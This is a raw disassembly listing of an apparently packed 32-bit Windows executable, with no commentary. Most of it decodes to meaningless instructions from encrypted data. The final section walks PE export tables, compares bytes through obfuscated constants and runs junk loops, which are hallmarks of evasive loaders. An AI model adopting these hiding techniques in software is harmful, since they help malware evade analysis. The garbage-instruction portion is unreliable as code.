  40fdbc:	add    BYTE PTR [ebx-0x15850a88],bh
  40fdc2:	push   edi
  40fdc3:	aad    0xa3
  40fdc5:	scas   eax,DWORD PTR es:[edi]
  40fdc6:	and    BYTE PTR [eax],bl
  40fdc8:	cs jae 0x40fda0
  40fdcb:	xchg   edi,eax
  40fdcc:	fs add edx,eax
  40fdcf:	cwde   
  40fdd0:	jno    0x40fd63
  40fdd2:	inc    edx
  40fdd3:	xchg   ebx,eax
  40fdd4:	pop    esp
  40fdd5:	push   esp
  40fdd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdd7:	xchg   esp,eax
  40fdd8:	push   0xffffffab
  40fdda:	nop
  40fddb:	inc    ebx
  40fddc:	imul   esp,edx,0xc15efff5
  40fde2:	mov    al,ds:0xa2afa4ce
  40fde7:	mov    ch,0xef
  40fde9:	dec    edx
  40fdea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdeb:	add    esp,DWORD PTR ds:[edi]
  40fdee:	jmp    0xb889:0x1cdfda70
  40fdf5:	pop    esi
  40fdf6:	or     esp,eax
  40fdf8:	push   edi
  40fdf9:	push   ss
  40fdfa:	popf   
  40fdfb:	add    DWORD PTR [eax+0x3995fe42],eax
  40fe01:	mov    esi,0xb34ae6cf
  40fe06:	adc    ebx,DWORD PTR [ecx-0x791e7310]
  40fe0c:	sub    DWORD PTR [esp+edx*2],0xffffffba
  40fe10:	or     al,0x30
  40fe12:	pop    esi
  40fe13:	aam    0x10
  40fe15:	(bad)  
  40fe16:	mov    al,0x66
  40fe18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe19:	loopne 0x40fe02
  40fe1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe1c:	dec    edx
  40fe1d:	stos   BYTE PTR es:[edi],al
  40fe1e:	rol    DWORD PTR [ebx-0x52],cl
  40fe21:	int3   
  40fe22:	jne    0x40fe2c
  40fe24:	das    
  40fe25:	hlt    
  40fe26:	and    al,0xb5
  40fe28:	aad    0x6b
  40fe2a:	jns    0x40fdd9
  40fe2c:	cmp    dl,BYTE PTR [edi+0x1d]
  40fe2f:	mov    cs,WORD PTR [eax+0x72]
  40fe32:	inc    ecx
  40fe33:	jmp    0xae5c925f
  40fe38:	jge    0x40fe2b
  40fe3a:	add    ecx,DWORD PTR [edx-0x17]
  40fe3d:	das    
  40fe3e:	cdq    
  40fe3f:	pop    ecx
  40fe40:	int    0xdc
  40fe42:	loopne 0x40fe3f
  40fe44:	xchg   esp,eax
  40fe45:	repnz xchg esi,eax
  40fe47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe48:	pop    ds
  40fe49:	or     ebx,DWORD PTR [si+0x46]
  40fe4d:	pop    ebp
  40fe4e:	jbe    0x40fe88
  40fe50:	rol    BYTE PTR [esi-0x7a409e05],1
  40fe56:	lahf   
  40fe57:	add    DWORD PTR [eax-0x22],edi
  40fe5a:	sbb    dh,bh
  40fe5c:	outs   dx,DWORD PTR ds:[esi]
  40fe5d:	iret   
  40fe5e:	add    BYTE PTR [edi-0x5af9b880],ah
  40fe64:	aad    0x80
  40fe66:	cmp    eax,0x71e27899
  40fe6b:	mov    ch,0x17
  40fe6d:	pop    edx
  40fe6e:	not    BYTE PTR [edx]
  40fe70:	sbb    ah,ch
  40fe72:	call   0xebae7fe0
  40fe77:	out    dx,eax
  40fe78:	(bad)  
  40fe79:	xchg   ecx,eax
  40fe7a:	loop   0x40fe10
  40fe7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe7d:	push   edx
  40fe7e:	xchg   edx,eax
  40fe7f:	dec    ebp
  40fe80:	stos   DWORD PTR es:[edi],eax
  40fe81:	lods   al,BYTE PTR ds:[esi]
  40fe82:	mov    edi,0x6654ca78
  40fe87:	jp     0x40feac
  40fe89:	adc    eax,0x95ace56b
  40fe8e:	(bad)  
  40fe8f:	out    dx,eax
  40fe90:	add    al,0xfe
  40fe92:	xchg   edi,eax
  40fe93:	cmp    eax,0xa99b1790
  40fe98:	fdivr  DWORD PTR ds:0x347860df
  40fe9e:	shl    DWORD PTR [ecx+0x163a63ce],0xc0
  40fea5:	test   eax,0x519ecba5
  40feaa:	add    cl,BYTE PTR [edi+eiz*2-0x2756cc9f]
  40feb1:	cmp    esi,DWORD PTR [eax+ebp*2+0x4b]
  40feb5:	pop    ecx
  40feb6:	call   0x1a712594
  40febb:	fnclex 
  40febd:	sub    DWORD PTR [esi-0x2e900041],0xffffff99
  40fec4:	out    0xbf,eax
  40fec6:	pushf  
  40fec7:	jp     0x40ff18
  40fec9:	sbb    DWORD PTR [ebp+0x256fd727],esp
  40fecf:	mov    bl,0xd4
  40fed1:	push   esi
  40fed2:	adc    BYTE PTR [ecx-0x13],bh
  40fed5:	stos   DWORD PTR es:[edi],eax
  40fed6:	in     al,dx
  40fed7:	adc    DWORD PTR [esp+ecx*8],0xb0cb1557
  40fede:	or     BYTE PTR [eax],cl
  40fee0:	icebp  
  40fee1:	jnp    0x40fe8c
  40fee3:	out    0x67,eax
  40fee5:	outs   dx,DWORD PTR ds:[esi]
  40fee6:	lahf   
  40fee7:	std    
  40fee8:	xchg   DWORD PTR fs:[esi+0x5c],esp
  40feec:	lods   eax,DWORD PTR ds:[esi]
  40feed:	ja     0x40fe98
  40feef:	xchg   esi,eax
  40fef0:	jbe    0x40ff25
  40fef2:	inc    sp
  40fef4:	fsub   DWORD PTR [ebx+0x3c]
  40fef7:	fwait
  40fef8:	sbb    bh,0xc7
  40fefb:	mov    ecx,0x843a8773
  40ff00:	shr    DWORD PTR [ebp-0x8d27d6],1
  40ff06:	jecxz  0x40ff47
  40ff08:	icebp  
  40ff09:	cmp    BYTE PTR [edx],0xf6
  40ff0c:	push   0x13
  40ff0e:	push   0x43
  40ff10:	xchg   edi,eax
  40ff11:	adc    esi,DWORD PTR [edi+eax*8+0x2]
  40ff15:	sub    dl,al
  40ff17:	jb     0x40fee4
  40ff19:	jns    0x40ff17
  40ff1b:	xor    DWORD PTR [ecx],eax
  40ff1d:	je     0x40fefb
  40ff1f:	xor    dl,BYTE PTR [ebx+0x49098c44]
  40ff25:	out    dx,eax
  40ff26:	fst    QWORD PTR [eax]
  40ff28:	pusha  
  40ff29:	xlat   BYTE PTR ds:[ebx]
  40ff2a:	cmp    ah,BYTE PTR [edx+0x9]
  40ff2d:	mov    ecx,0x62f15268
  40ff32:	out    dx,al
  40ff33:	sti    
  40ff34:	lds    ebx,FWORD PTR [ecx+0x6641eecd]
  40ff3a:	mov    ebx,0xef7e5870
  40ff3f:	xor    cl,dl
  40ff41:	ins    DWORD PTR es:[edi],dx
  40ff42:	push   es
  40ff43:	iret   
  40ff44:	inc    ebp
  40ff45:	loope  0x40ff34
  40ff47:	sbb    al,0x3e
  40ff49:	call   0x8cc3:0xba9d97f6
  40ff50:	cmp    edi,DWORD PTR [ebp+0x7bab7611]
  40ff56:	adc    edi,edi
  40ff58:	cmc    
  40ff59:	loope  0x40ff88
  40ff5b:	outs   dx,DWORD PTR ds:[esi]
  40ff5c:	neg    DWORD PTR [eax+0x53]
  40ff5f:	adc    eax,0x52196a0
  40ff64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff65:	mov    ah,0x60
  40ff67:	fild   QWORD PTR [ecx]
  40ff69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff6a:	pop    ss
  40ff6b:	pushf  
  40ff6c:	out    dx,eax
  40ff6d:	pop    ds
  40ff6e:	aam    0x7b
  40ff70:	or     ah,dh
  40ff72:	sub    edi,esp
  40ff74:	xor    al,0xfa
  40ff76:	jns    0x40ffc8
  40ff78:	xchg   edx,eax
  40ff79:	loop   0x40ffad
  40ff7b:	sub    al,0xfb
  40ff7d:	das    
  40ff7e:	or     DWORD PTR [edx],0x4e9294a2
  40ff84:	sub    bh,BYTE PTR [ebp-0x2c]
  40ff87:	inc    esp
  40ff88:	rcr    esi,0x2b
  40ff8b:	mov    edx,0x267f0d27
  40ff90:	outs   dx,BYTE PTR ds:[esi]
  40ff91:	mov    ebp,0xed17bd89
  40ff96:	jge    0x40ffe6
  40ff98:	neg    BYTE PTR [edx+0x10]
  40ff9b:	shr    BYTE PTR [ebx+0x14],cl
  40ff9e:	mov    edi,0x4c0057b2
  40ffa3:	pushaw 
  40ffa5:	or     al,0x11
  40ffa7:	or     BYTE PTR [ebx+esi*2+0x7f],cl
  40ffab:	adc    eax,0x6a5bb68f
  40ffb0:	lods   al,BYTE PTR ds:[esi]
  40ffb1:	jnp    0x40ff9c
  40ffb3:	or     al,0xde
  40ffb5:	jns    0x40ffaf
  40ffb7:	xor    ebx,DWORD PTR [esi]
  40ffb9:	jnp    0x41000b
  40ffbb:	mov    bh,0xb9
  40ffbd:	shr    DWORD PTR [edx+ebp*4-0x44840246],1
  40ffc4:	xlat   BYTE PTR ds:[ebx]
  40ffc5:	repnz mov eax,0x35ad68e6
  40ffcb:	push   edx
  40ffcc:	inc    ecx
  40ffcd:	fidiv  WORD PTR [esi+0x4e]
  40ffd0:	sub    bl,BYTE PTR [eax+0x6d]
  40ffd3:	pop    esp
  40ffd4:	mov    edx,0xa6a7e994
  40ffd9:	sbb    ebp,ecx
  40ffdb:	fld    DWORD PTR [edx+ebp*1]
  40ffde:	cs (bad) 
  40ffe0:	clc    
  40ffe1:	lods   eax,DWORD PTR ds:[esi]
  40ffe2:	test   al,0xc9
  40ffe4:	push   esp
  40ffe5:	out    0x5a,al
  40ffe7:	adc    eax,0x374ba74b
  40ffec:	cmp    cl,cl
  40ffee:	inc    ecx
  40ffef:	fmul   QWORD PTR ss:[ebp-0x33]
  40fff3:	xor    cl,BYTE PTR [edi-0x6e80d5f0]
  40fff9:	jl     0x40ffe8
  40fffb:	nop
  40fffc:	sub    DWORD PTR [edx+eax*8-0x259ce49],edi
  410003:	(bad)  
  410004:	push   esp
  410005:	inc    esi
  410006:	enter  0x5f93,0x1c
  41000a:	ret    0x515b
  41000d:	fisttp DWORD PTR [edi+0x7da7a515]
  410013:	mov    ds:0x8e3072cf,eax
  410018:	jmp    0x72d6d921
  41001d:	mov    bh,0x72
  41001f:	retf   
  410020:	(bad)  
  410022:	pusha  
  410023:	out    dx,eax
  410024:	mov    ebp,0x73c149a1
  410029:	fstp   TBYTE PTR [ecx]
  41002b:	jae    0x40ffaf
  41002d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41002e:	lds    ebp,FWORD PTR [ecx]
  410030:	out    dx,al
  410031:	pop    ds
  410032:	and    al,0x69
  410034:	(bad)  
  410035:	sbb    eax,0x76f75b77
  41003a:	sti    
  41003b:	mov    eax,fs
  41003d:	outs   dx,DWORD PTR ds:[esi]
  41003e:	cmp    eax,DWORD PTR [ecx]
  410040:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410041:	sti    
  410042:	pop    esi
  410043:	loope  0x41004c
  410045:	outs   dx,DWORD PTR ds:[esi]
  410046:	inc    ebp
  410047:	sub    al,BYTE PTR [ecx-0x2a]
  41004a:	xlat   BYTE PTR ds:[ebx]
  41004b:	xor    cl,0x3
  41004e:	test   esp,esi
  410050:	neg    BYTE PTR [ecx-0x54]
  410053:	mov    al,0x1c
  410055:	mov    ecx,0x5e69c1d6
  41005a:	pop    edi
  41005b:	mov    bh,0xda
  41005d:	aaa    
  41005e:	pop    eax
  41005f:	jnp    0x410020
  410061:	imul   esi,ecx,0xe23d6f63
  410067:	push   edx
  410068:	mov    DWORD PTR [ecx],eax
  41006a:	mov    BYTE PTR [eax],bl
  41006c:	push   edx
  41006d:	inc    ebx
  41006e:	fwait
  41006f:	(bad)  
  410070:	loopne 0x4100ea
  410072:	fmulp  st(4),st
  410074:	clc    
  410075:	mov    esi,0xaacf489f
  41007a:	jb     0x4100f7
  41007c:	ins    DWORD PTR es:[edi],dx
  41007d:	rol    BYTE PTR [edx],0x88
  410080:	lea    ebp,[edi]
  410082:	pop    ebp
  410083:	pop    ebx
  410084:	jge    0x41006b
  410086:	std    
  410087:	dec    ecx
  410088:	sar    BYTE PTR [esi+0x1c],0xd
  41008c:	fisttp QWORD PTR [ebp-0x289d37c1]
  410092:	mov    ecx,0x381cbf7c
  410097:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410098:	out    0x25,al
  41009a:	imul   esi,DWORD PTR [edi-0x73],0xffffffd9
  41009e:	sbb    al,0x30
  4100a0:	dec    esp
  4100a1:	pop    ebp
  4100a2:	test   eax,0x3f1fb8ed
  4100a7:	dec    ebx
  4100a8:	ja     0x4100c8
  4100aa:	sub    ch,ch
  4100ac:	into   
  4100ad:	stc    
  4100ae:	mov    esp,0xc7338243
  4100b3:	das    
  4100b4:	cdq    
  4100b5:	dec    esi
  4100b6:	jl     0x4100be
  4100b8:	cmp    BYTE PTR [edx-0x44],0x83
  4100bc:	pop    es
  4100bd:	or     BYTE PTR [ebx+ebx*1-0x18],al
  4100c1:	xchg   ecx,eax
  4100c2:	sbb    ebx,esp
  4100c4:	fwait
  4100c5:	dec    eax
  4100c6:	pop    ecx
  4100c7:	sbb    al,0xf6
  4100c9:	hlt    
  4100ca:	dec    ebx
  4100cb:	aaa    
  4100cc:	scas   al,BYTE PTR es:[edi]
  4100cd:	fnstenv [ecx]
  4100cf:	into   
  4100d0:	xor    eax,0xb54435ef
  4100d5:	mov    dh,0x4f
  4100d7:	jmp    0x937890dd
  4100dc:	addr16 sahf 
  4100de:	test   eax,edx
  4100e0:	cmp    DWORD PTR [ebx-0x3],edi
  4100e3:	imul   eax,DWORD PTR [edi+0x25],0x58
  4100e7:	dec    eax
  4100e8:	adc    eax,0x48963845
  4100ed:	push   0x2b82be39
  4100f2:	out    dx,al
  4100f3:	sbb    DWORD PTR [esi-0x2082dd7c],eax
  4100f9:	dec    esp
  4100fa:	xchg   BYTE PTR [ebx-0x38],ah
  4100fd:	in     eax,dx
  4100fe:	call   0x6e85:0xa98a8d24
  410105:	mov    al,ds:0xcfba17f9
  41010a:	shr    BYTE PTR [esi-0x538d2319],cl
  410110:	fimul  WORD PTR [edi-0x60e7c77b]
  410116:	cvttps2pi mm1,QWORD PTR [esi+0x16027615]
  41011d:	adc    eax,0xdaaf8067
  410122:	cmp    DWORD PTR [ecx+esi*1],ebp
  410125:	in     eax,dx
  410126:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410127:	shr    DWORD PTR [ebx-0x2b],cl
  41012a:	mov    ebp,0x61dc1251
  41012f:	adc    BYTE PTR [edx-0xf],ch
  410132:	sub    cl,dh
  410134:	shl    DWORD PTR [edx+edi*8-0xd8f1dc],cl
  41013b:	push   ecx
  41013c:	mov    edx,esi
  41013e:	or     DWORD PTR [ebp*1-0x59d1bb3b],ebp
  410145:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410146:	lods   al,BYTE PTR ds:[esi]
  410147:	mov    dh,0xd8
  410149:	pop    edx
  41014a:	popf   
  41014b:	push   ds
  41014c:	add    DWORD PTR [esi+0x60042f6f],0x56f21aac
  410156:	add    bl,al
  410158:	stos   BYTE PTR es:[edi],al
  410159:	out    dx,eax
  41015a:	push   esi
  41015b:	imul   edx,DWORD PTR [ecx+0x6713335a],0x1a
  410162:	test   eax,0xab496283
  410167:	mov    edi,0x308b59c
  41016c:	and    BYTE PTR [eax-0x26197e93],ch
  410172:	fistp  QWORD PTR [ebx]
  410174:	repz les ecx,FWORD PTR [ebx-0x28d8710b]
  41017b:	xor    esp,ebx
  41017d:	pop    esi
  41017e:	scas   eax,DWORD PTR es:[edi]
  41017f:	push   edx
  410180:	idiv   BYTE PTR [eax]
  410182:	xor    bl,BYTE PTR [ebp-0x5133a983]
  410188:	add    DWORD PTR [esi-0xe3072bb],eax
  41018e:	test   DWORD PTR [edi+ecx*4],0x7359a571
  410195:	lahf   
  410196:	adc    DWORD PTR [edx-0x1f],0xffffff97
  41019a:	inc    ecx
  41019b:	mov    ebp,0x7771e66c
  4101a0:	xchg   ecx,eax
  4101a1:	mov    eax,ds:0xda80d646
  4101a6:	daa    
  4101a7:	call   0x4d27:0x8e851ac5
  4101ae:	jl     0x4101fe
  4101b0:	js     0x4101b5
  4101b2:	mov    eax,ds:0xe247d02f
  4101b7:	cmp    ebp,edi
  4101b9:	sti    
  4101ba:	cmp    BYTE PTR [ecx+0x68],al
  4101bd:	jg     0x41017e
  4101bf:	ins    DWORD PTR es:[edi],dx
  4101c0:	mov    ebx,0x8fb89422
  4101c5:	or     ebx,DWORD PTR [esi-0x64]
  4101c8:	retf   0xa498
  4101cb:	mov    cl,0x2
  4101cd:	cmp    al,0x84
  4101cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101d0:	jecxz  0x4101e1
  4101d2:	pop    es
  4101d3:	xlat   BYTE PTR ds:[ebx]
  4101d4:	inc    ebx
  4101d5:	mov    dl,0xac
  4101d7:	sahf   
  4101d8:	xchg   ecx,eax
  4101d9:	in     eax,dx
  4101da:	push   edx
  4101db:	je     0x410225
  4101dd:	or     al,0xd1
  4101df:	inc    esp
  4101e0:	jnp    0x410170
  4101e2:	div    DWORD PTR [edx-0x7e]
  4101e5:	out    0x8,al
  4101e7:	xchg   esi,eax
  4101e8:	push   0xd7ce9807
  4101ed:	out    dx,eax
  4101ee:	mov    cl,0xa5
  4101f0:	addr16 cli 
  4101f2:	mov    ebp,DWORD PTR [eax]
  4101f4:	lea    edi,[edx-0x41]
  4101f7:	(bad)  
  4101f8:	sub    al,BYTE PTR [eax-0x27]
  4101fb:	pop    ds
  4101fc:	sub    BYTE PTR [ecx-0x3a],ah
  4101ff:	shl    DWORD PTR [ebx-0x5a29cc35],0xef
  410206:	sub    cl,BYTE PTR [edx]
  410208:	stc    
  410209:	jecxz  0x410282
  41020b:	mov    dh,0x72
  41020d:	rol    DWORD PTR [ebx],1
  41020f:	sub    ebp,DWORD PTR [edi-0x2bf32b4b]
  410215:	ins    BYTE PTR es:[edi],dx
  410216:	dec    eax
  410217:	adc    BYTE PTR [esi+0x20a1111d],dl
  41021d:	xchg   esp,eax
  41021e:	dec    esi
  41021f:	lea    edi,[edi+0x26]
  410222:	sub    BYTE PTR [esi+eiz*2],dh
  410225:	scas   eax,DWORD PTR es:[edi]
  410226:	popa   
  410227:	add    eax,0xc03ad960
  41022c:	mov    ch,0xfe
  41022e:	inc    ebp
  41022f:	adc    BYTE PTR [esi+0x6f],0xc5
  410233:	add    BYTE PTR [edx-0x21d2391a],dl
  410239:	mov    esi,0x22469085
  41023e:	outs   dx,DWORD PTR ds:[esi]
  41023f:	inc    esp
  410240:	lods   al,BYTE PTR ds:[esi]
  410241:	jno    0x4101df
  410243:	jl     0x4102c2
  410245:	pop    ss
  410246:	or     BYTE PTR [edx],ah
  410248:	in     eax,0xcf
  41024a:	cmp    ecx,0x4d119507
  410250:	fcmovbe st,st(6)
  410252:	adc    ebx,DWORD PTR [edx]
  410254:	mov    ecx,DWORD PTR [edx+esi*4-0x56]
  410258:	mov    ah,0xb4
  41025a:	pop    edi
  41025b:	psubusw mm1,QWORD PTR [edx*4-0x6ea6e663]
  410263:	push   edx
  410264:	js     0x41021d
  410266:	jp     0x41025f
  410268:	aaa    
  410269:	xchg   BYTE PTR [ebx+0x5f],cl
  41026c:	(bad)  
  41026d:	gs sti 
  41026f:	and    al,0xaa
  410271:	jl     0x4102af
  410273:	iret   
  410274:	pop    es
  410275:	ficom  DWORD PTR [eax+0x31]
  410278:	clc    
  410279:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41027a:	mov    bl,0x75
  41027c:	adc    al,bl
  41027e:	(bad)  
  41027f:	ficom  DWORD PTR [eax]
  410281:	adc    ch,BYTE PTR [esi]
  410283:	inc    edi
  410284:	jno    0x410302
  410286:	push   0xdfa457b7
  41028b:	jmp    0xe7c4:0x5a0ad12c
  410292:	(bad)  
  410293:	adc    eax,0x88971595
  410298:	dec    eax
  410299:	and    dh,bl
  41029b:	pop    edi
  41029c:	sub    DWORD PTR [ebx+0x5d070711],0x92586ad3
  4102a6:	sub    eax,0xa3826f03
  4102ab:	clc    
  4102ac:	inc    ebx
  4102ad:	cmc    
  4102ae:	or     DWORD PTR [ebx+0x11],edx
  4102b1:	ret    
  4102b2:	adc    al,BYTE PTR [ebx+0x2c]
  4102b5:	mov    ebp,0x5dfad579
  4102ba:	enter  0x7b1b,0xbd
  4102be:	ja     0x4102c6
  4102c0:	sub    al,0x17
  4102c3:	aad    0x99
  4102c5:	or     eax,0xb20d8e35
  4102ca:	call   0xcea3:0x38b81e6b
  4102d1:	movntq (bad),mm7
  4102d2:	out    0xf8,eax
  4102d4:	mov    ch,0x38
  4102d6:	mov    al,ds:0xfea249ec
  4102db:	xchg   esi,eax
  4102dc:	lea    ebx,[eax-0x4dfb09ed]
  4102e2:	aaa    
  4102e3:	xor    ah,ah
  4102e5:	xor    ch,dh
  4102e7:	popa   
  4102e8:	fadd   DWORD PTR [esi]
  4102ea:	xor    BYTE PTR [edx],al
  4102ec:	icebp  
  4102ed:	or     al,0x4c
  4102ef:	pop    ebp
  4102f0:	mov    ebx,0x635f2393
  4102f5:	jnp    0x4102cb
  4102f7:	jbe    0x410299
  4102f9:	cdq    
  4102fa:	imul   eax,edi,0x3a707789
  410300:	xchg   ebp,eax
  410301:	loope  0x410294
  410303:	jmp    DWORD PTR [edi+ecx*2+0x5a89e60a]
  41030a:	iret   
  41030b:	fwait
  41030c:	ja     0x41037d
  41030e:	inc    edx
  41030f:	mov    gs,WORD PTR [ecx-0x75abdbb4]
  410315:	pop    ebx
  410316:	jno    0x4102f0
  410318:	xor    BYTE PTR [edx+0x41cb5247],bh
  41031e:	dec    edi
  41031f:	clc    
  410320:	and    DWORD PTR [eax],edx
  410322:	shr    BYTE PTR [edi+eax*1-0x1a],1
  410326:	addr16 adc eax,0xc433a37c
  41032c:	push   esp
  41032d:	daa    
  41032e:	stos   BYTE PTR es:[edi],al
  41032f:	fstp   QWORD PTR [ecx]
  410331:	jmp    0x5d25a4c6
  410336:	mov    ds:0x42f63a38,eax
  41033b:	and    eax,0x25d30d80
  410340:	inc    esp
  410341:	arpl   WORD PTR [eax-0x8d72436],sp
  410347:	ret    
  410348:	fist   WORD PTR [eax]
  41034a:	mov    ecx,0x57ab074f
  41034f:	retf   0x1e69
  410352:	cmp    DWORD PTR ss:[edi],ebx
  410355:	pop    esi
  410356:	das    
  410357:	mul    bh
  410359:	int3   
  41035a:	adc    ebx,eax
  41035c:	jb     0x410315
  41035e:	fstp   st(6)
  410360:	(bad)  
  410362:	dec    ebp
  410363:	mov    edx,0x878e8b37
  410368:	inc    ecx
  410369:	pushf  
  41036a:	fisttp WORD PTR [ebx-0x21]
  41036d:	mov    ebx,0x3b4b
  410372:	sub    di,bx
  410375:	mov    ebx,0x8a85
  41037a:	xor    di,bx
  41037d:	mov    ebx,0x4f8a
  410382:	cmp    di,bx
  410385:	jne    0x4103ad
  41038b:	movsx  di,BYTE PTR [eax]
  41038f:	mov    ebx,0x3b4b
  410394:	sub    di,bx
  410397:	mov    ebx,0x8a85
  41039c:	xor    di,bx
  41039f:	mov    ebx,0x4f87
  4103a4:	cmp    di,bx
  4103a7:	je     0x4103bd
  4103ad:	mov    edi,DWORD PTR [ebp-0x10]
  4103b0:	xor    edi,ecx
  4103b2:	mov    ebx,esi
  4103b4:	sub    ebx,edi
  4103b6:	add    eax,ebx
  4103b8:	jmp    0x40dfbd
  4103bd:	mov    esi,DWORD PTR [ebp-0x14]
  4103c0:	mov    esi,DWORD PTR [esi]
  4103c2:	mov    edi,DWORD PTR [eax+0x3c]
  4103c5:	lea    esi,[edi+esi*8+0x78]
  4103c9:	mov    esi,DWORD PTR [esi+eax*1]
  4103cc:	mov    DWORD PTR [ebp-0x8],esi
  4103cf:	mov    esi,DWORD PTR [ebp+0x8]
  4103d2:	xor    esi,ecx
  4103d4:	add    esi,edx
  4103d6:	mov    DWORD PTR [ebp-0x14],esi
  4103d9:	mov    esi,DWORD PTR [ebp+0x8]
  4103dc:	mov    edi,DWORD PTR [ebp-0x8]
  4103df:	xor    esi,ecx
  4103e1:	add    esi,edx
  4103e3:	pop    ebx
  4103e4:	cmp    edi,esi
  4103e6:	jne    0x410404
  4103ec:	mov    eax,DWORD PTR [ebp+0xc]
  4103ef:	xor    eax,ecx
  4103f1:	mov    ecx,DWORD PTR [ebp-0x8]
  4103f4:	add    eax,edx
  4103f6:	imul   eax,ecx
  4103f9:	mov    DWORD PTR [ebp-0x8],eax
  4103fc:	push   DWORD PTR [ebp+0x18]
  4103ff:	jmp    0x410458
  410404:	mov    ecx,DWORD PTR [ebp-0x8]
  410407:	add    ecx,eax
  410409:	mov    DWORD PTR [ebp-0x14],ecx
  41040c:	mov    ecx,DWORD PTR [ebp-0x14]
  41040f:	mov    ecx,DWORD PTR [ecx+0xc]
  410412:	movsx  cx,BYTE PTR [ecx+eax*1]
  410417:	mov    edx,0x3b4b
  41041c:	sub    cx,dx
  41041f:	mov    edx,0x8a85
  410424:	xor    cx,dx
  410427:	mov    edx,0x4f85
  41042c:	cmp    cx,dx
  41042f:	jne    0x4103fc
  410435:	mov    ecx,DWORD PTR ds:0x41d3dc
  41043b:	mov    ecx,DWORD PTR [ecx+0x198]
  410441:	mov    DWORD PTR [ecx],eax
  410443:	jmp    0x410469
  410448:	mov    ecx,DWORD PTR [ebp+0x18]
  41044b:	cmp    ecx,0xf89c85b5
  410451:	jne    0x410469
  410457:	push   eax
  410458:	push   DWORD PTR [ebp+0x14]
  41045b:	push   DWORD PTR [ebp+0x10]
  41045e:	push   DWORD PTR [ebp+0xc]
  410461:	push   DWORD PTR [ebp+0x8]
  410464:	call   0x40b7a6
  410469:	pop    edi
  41046a:	pop    esi
  41046b:	leave  
  41046c:	ret    0x14
  41046f:	push   ebp
  410470:	mov    ebp,esp
  410472:	sub    esp,0x48
  410475:	and    DWORD PTR ds:0x427018,0x0
  41047f:	mov    eax,ds:0x427018
  410484:	inc    eax
  410485:	mov    ds:0x427018,eax
  41048a:	cmp    DWORD PTR ds:0x427018,0xc
  410491:	jne    0x4104a6
  410497:	push   DWORD PTR [ebp-0xc]
  41049a:	push   DWORD PTR [ebp-0xc]
  41049d:	push   DWORD PTR [ebp-0x28]
  4104a0:	call   DWORD PTR ds:0x421028
  4104a6:	cmp    DWORD PTR ds:0x427018,0xb
  4104ad:	jne    0x4104be
  4104b3:	mov    eax,ds:0x427018
  4104b8:	inc    eax
  4104b9:	mov    ds:0x427018,eax
  4104be:	cmp    DWORD PTR ds:0x427018,0x1f
  4104c5:	jb     0x41047f
  4104cb:	adc    DWORD PTR ds:0x428010,ebx
  4104d1:	push   ebx
  4104d2:	mov    DWORD PTR ds:0x426010,0x1e
  4104dc:	cmp    DWORD PTR ds:0x426010,0x0
  4104e3:	je     0x410526
  4104e9:	cmp    DWORD PTR ds:0x426010,0x26
  4104f0:	jne    0x410501
  4104f6:	push   0x41ff82
  4104fb:	call   DWORD PTR ds:0x42102c
  410501:	xor    eax,eax
  410503:	xor    eax,DWORD PTR ds:0x426010
  410509:	dec    eax
  41050a:	mov    ds:0x426010,eax
  41050f:	jmp    0x4104dc
  410514:	movzx  eax,WORD PTR ds:0x427014
  41051b:	sub    eax,DWORD PTR ds:0x426004
  410521:	mov    ds:0x427014,eax
  410526:	push   esi
  410527:	push   edi
  410528:	and    DWORD PTR ds:0x428000,0x0
  410532:	jmp    0x410544
  410537:	mov    edi,DWORD PTR ds:0x428000
  41053d:	inc    edi
  41053e:	mov    DWORD PTR ds:0x428000,edi
  410544:	cmp    DWORD PTR ds:0x428000,0x1e
  41054b:	jae    0x410597
  410551:	cmp    DWORD PTR ds:0x428000,0x1f
  410558:	jne    0x41058c
  41055e:	push   DWORD PTR [ebp-0x28]
  410561:	push   0x3d00
  410566:	push   0x5480
  41056b:	push   DWORD PTR [ebp-0x10]
  41056e:	push   DWORD PTR [ebp-0x24]
  410571:	push   DWORD PTR [ebp-0x1c]
  410574:	push   0x6187
  410579:	push   DWORD PTR [ebp-0x20]
  41057c:	push   0x5fd8
  410581:	push   0x12ef
  410586:	call   DWORD PTR ds:0x421030
  41058c:	jmp    0x410537
  410591:	and    eax,DWORD PTR ds:0x426018
  410597:	xor    esi,esi
  410599:	and    DWORD PTR ds:0x428008,0x0
  4105a3:	jmp    0x4105b5
  4105a8:	mov    edi,DWORD PTR ds:0x428008
  4105ae:	inc    edi
  4105af:	mov    DWORD PTR ds:0x428008,edi
  4105b5:	cmp    DWORD PTR ds:0x428008,0x1e
  4105bc:	jae    0x4105ff
  4105c2:	cmp    DWORD PTR ds:0x428008,0xe
  4105c9:	jne    0x4105e0
  4105cf:	push   DWORD PTR [ebp-0x18]
  4105d2:	push   0x425020
  4105d7:	push   DWORD PTR [ebp-0x28]
  4105da:	call   DWORD PTR ds:0x421034
  4105e0:	cmp    DWORD PTR ds:0x428008,0xd
  4105e7:	jne    0x4105fa
  4105ed:	mov    edi,DWORD PTR ds:0x428008
  4105f3:	inc    edi
  4105f4:	mov    DWORD PTR ds:0x428008,edi
  4105fa:	jmp    0x4105a8
  4105ff:	mov    DWORD PTR [ebp-0x20],esi
  410602:	or     eax,edi
  410604:	mov    eax,DWORD PTR [ebp-0xc]
  410607:	push   0x21
  410609:	and    DWORD PTR ds:0x429004,edi
  41060f:	mov    DWORD PTR [ebp-0xc],eax
  410612:	add    edi,DWORD PTR ds:0x425020
  410618:	pop    edi
  410619:	add    DWORD PTR ds:0x425010,0x428010
  410623:	push   0x41d4f0
  410628:	call   DWORD PTR ds:0x421040
  41062e:	push   esi
  41062f:	and    DWORD PTR ds:0x425008,0x428018
  410639:	push   0x2
